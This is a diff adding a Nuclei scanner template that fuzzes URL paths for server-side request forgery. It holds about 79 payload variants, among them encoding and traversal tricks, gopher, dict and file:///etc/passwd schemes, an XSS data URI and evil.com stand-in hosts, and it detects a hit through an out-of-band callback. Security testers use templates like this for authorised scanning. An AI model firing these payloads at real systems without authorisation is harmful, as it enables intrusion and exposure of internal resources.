@@ -1,0 +1,103 @@
+id: ssrf_path
+
+info:
+  name: ssrf_path_fazzing
+  author: raff
+  severity: high
+  description: ssrf.
+  reference: https://raff
+  metadata:
+    max-request: 79
+  tags: ssrf
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}///{{interactsh-url}}"
+      - "{{BaseURL}}/%00/{{interactsh-url}}"
+      - "{{BaseURL}}/%00{{interactsh-url}}"
+      - "{{BaseURL}}/%00{{interactsh-url}}/.jpg"
+      - "{{BaseURL}}/%09/{{interactsh-url}}"
+      - "{{BaseURL}}/%09{{interactsh-url}}"
+      - "{{BaseURL}}/%0A/{{interactsh-url}}"
+      - "{{BaseURL}}/%0A{{interactsh-url}}"
+      - "{{BaseURL}}/%0D/{{interactsh-url}}"
+      - "{{BaseURL}}/%0D{{interactsh-url}}"
+      - "{{BaseURL}}/[::1]/{{interactsh-url}}"
+      - "{{BaseURL}}/\\[::1\\]/{{interactsh-url}}"
+      - "{{BaseURL}}/%20{{interactsh-url}}"
+      - "{{BaseURL}}/%23{{interactsh-url}}"
+      - "{{BaseURL}}/%252e%252e%252f{{interactsh-url}}"
+      - "{{BaseURL}}/%252E%252E%252F{{interactsh-url}}"
+      - "{{BaseURL}}/%252e%252e/{{interactsh-url}}"
+      - "{{BaseURL}}/%252E.{{interactsh-url}}"
+      - "{{BaseURL}}/%252F%252F%252F{{interactsh-url}}%252F"
+      - "{{BaseURL}}/%25%32%45%25%32%45%25%32%46{{interactsh-url}}"
+      - "{{BaseURL}}/%25%32%45/{{interactsh-url}}"
+      - "{{BaseURL}}/%25%32e%25%32e%25%32f{{interactsh-url}}"
+      - "{{BaseURL}}/%25E5%258F%2588{{interactsh-url}}"
+      - "{{BaseURL}}/%25{{interactsh-url}}"
+      - "{{BaseURL}}/%2e%2e%2f{{interactsh-url}}"
+      - "{{BaseURL}}/%2E%2E%2F{{interactsh-url}}"
+      - "{{BaseURL}}/%2E%2E/{{interactsh-url}}"
+      - "{{BaseURL}}/%2F%2F%2F{{interactsh-url}}/%2F"
+      - "{{BaseURL}}/%2F{{interactsh-url}}/%2F"
+      - "{{BaseURL}}/%40%40%40{{interactsh-url}}"
+      - "{{BaseURL}}/%40%40{{interactsh-url}}"
+      - "{{BaseURL}}/%40/{{interactsh-url}}"
+      - "{{BaseURL}}/%48%54%54%50%3A%2F%2F{{interactsh-url}}"
+      - "{{BaseURL}}/%68%74%74%70%3A%2F%2F{{interactsh-url}}"
+      - "{{BaseURL}}/%7e{{interactsh-url}}"
+      - "{{BaseURL}}/%c0%ae%c0%ae%c0%af{{interactsh-url}}"
+      - "{{BaseURL}}/data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4={{interactsh-url}}"
+      - "{{BaseURL}}/data:text/html,<script>alert('XSS')</script>{{interactsh-url}}"
+      - "{{BaseURL}}/dict://{{interactsh-url}}"
+      - "{{BaseURL}}/file:///etc/passwd{{interactsh-url}}"
+      - "{{BaseURL}}/ftp://{{interactsh-url}}"
+      - "{{BaseURL}}/gopher://{{interactsh-url}}"
+      - "{{BaseURL}}/{{Hostname}}.{{interactsh-url}}"
+      - "{{BaseURL}}/{{Hostname}}.{{interactsh-url}}/{{Hostname}}.{{interactsh-url}}"
+      - "{{BaseURL}}/{{Hostname}}:{{Port}}#\\@{{interactsh-url}}:80/"
+      - "{{BaseURL}}/{{Hostname}}:{{Port}}:\\@@{{interactsh-url}}:80/"
+      - "{{BaseURL}}/{{Hostname}}:{{Port}}\\@@{{interactsh-url}}:80/"
+      - "{{BaseURL}}/{{Hostname}}:{{Port}}\\@{{interactsh-url}}:80/"
+      - "{{BaseURL}}/http://evil.com{{interactsh-url}}"
+      - "{{BaseURL}}/http://{{interactsh-url}}"
+      - "{{BaseURL}}/ＨＴＴＰ://{{interactsh-url}}"
+      - "{{BaseURL}}/https://evil.com{{interactsh-url}}"
+      - "{{BaseURL}}/https://{{interactsh-url}}"
+      - "{{BaseURL}}/#{{interactsh-url}}"
+      - "{{BaseURL}}/..././.../{{interactsh-url}}"
+      - "{{BaseURL}}/.../{{interactsh-url}}"
+      - "{{BaseURL}}/../../{{interactsh-url}}"
+      - "{{BaseURL}}/..;{{interactsh-url}}"
+      - "{{BaseURL}}/././{{interactsh-url}}"
+      - "{{BaseURL}}/./{{interactsh-url}}"
+      - "{{BaseURL}}///{{interactsh-url}}"
+      - "{{BaseURL}}/@@@{{interactsh-url}}"
+      - "{{BaseURL}}/@@{{interactsh-url}}"
+      - "{{BaseURL}}/[{{interactsh-url}}]"
+      - "{{BaseURL}}/\\{{interactsh-url}}"
+      - "{{BaseURL}}/{{interactsh-url}}"
+      - "{{BaseURL}}/{{interactsh-url}}."
+      - "{{BaseURL}}/~{{interactsh-url}}"
+      - "{{BaseURL}}/⁣⁣{{interactsh-url}}"
+      - "{{BaseURL}}/⌜{{interactsh-url}}⌝"
+      - "{{BaseURL}}/{{interactsh-url}}%00/internal-resource"
+      - "{{BaseURL}}/{{interactsh-url}}/{{interactsh-url}}"
+      - "{{BaseURL}}/{{interactsh-url}}/../internal-resource"
+      - "{{BaseURL}}/{{interactsh-url}}#malicious-fragment"
+      - "{{BaseURL}}/{{interactsh-url}}/other-path"
+      - "{{BaseURL}}/to_upper({{interactsh-url}})"
+      - "{{BaseURL}}/%u002f{{interactsh-url}}"
+      - "{{BaseURL}}/%u003a%u002f%u002f{{interactsh-url}}"
+      - "{{BaseURL}}/user:password@{{interactsh-url}}"
+      - "{{BaseURL}}/ws://evil.com{{interactsh-url}}"
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+
+# digest: 4b0a00483046022100d60dc51cb537067ff6eca1c394ad8c07ba4dbdaadb17984f72000e5993edcccf022100aadc1f2330b9f86addc6ecd8a283f2d57af8da34c7a8a9bea153c92730017824:922c64590222798bb761d5b6d8e72950
